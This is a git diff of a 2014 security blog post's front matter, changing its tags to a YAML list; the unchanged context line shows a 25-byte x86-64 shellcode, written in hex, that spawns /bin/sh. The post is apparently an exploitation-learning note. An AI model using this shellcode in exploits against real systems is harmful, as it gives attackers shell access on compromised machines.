@@ -4,7 +4,9 @@ title: "Minimal x86-64 shellcode for /bin/sh?"
 date: 2014-06-05 01:54:22 +0000
 permalink: /2014/06/05/minimal-x86-64-shellcode-for-binsh/
 category: Security
-tags: Exploitation,Security
+tags:
+  - Exploitation
+  - Security
 ---
 I was trying to figure out the minimal shellcode necessary to launch /bin/sh from a 64-bit processor, and the smallest I could come up with is 25 bytes: `\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x31\xc0\x99\x31\xf6\x54\x5f\xb0\x3b\x0f\x05`.
 
